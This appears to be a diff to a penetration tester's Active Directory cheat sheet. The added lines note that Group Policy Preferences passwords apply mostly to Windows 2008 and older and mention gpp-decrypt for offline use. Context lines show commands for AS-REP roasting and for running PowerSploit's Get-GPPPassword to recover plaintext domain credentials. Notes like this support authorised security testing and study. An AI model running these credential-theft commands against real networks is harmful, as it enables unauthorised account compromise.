@@ -35,11 +35,18 @@ Invoke-ASREPRoast -Verbose | fl
 ```
 
 ```
+GPP for setting admin passwords really only applicable to windows 2008 and older. 
+After that LAPS is the standard method. 
+Still useful to check though in case didn't clean up somewhere
+
 #Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
 powershell-import /opt/PowerSploit/Exfiltration/Get-GPPPassword.ps1
 powershell Get-GPPPassword
 
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+
+
+(if using offline then use gpp-decrypt) 
 ```
 
 Note: Great cheat sheets for powerview, powerup,powersploit, etc.
@@ -215,8 +222,6 @@ ObjectDN - the target of the ACE
 Identity Reference - Item that has rights to ObjectDN
 
 ActiveDirectoryRights - Dictates what the IdentityReference can do to ObjectDN
-
-
 
 **Resources:**
 
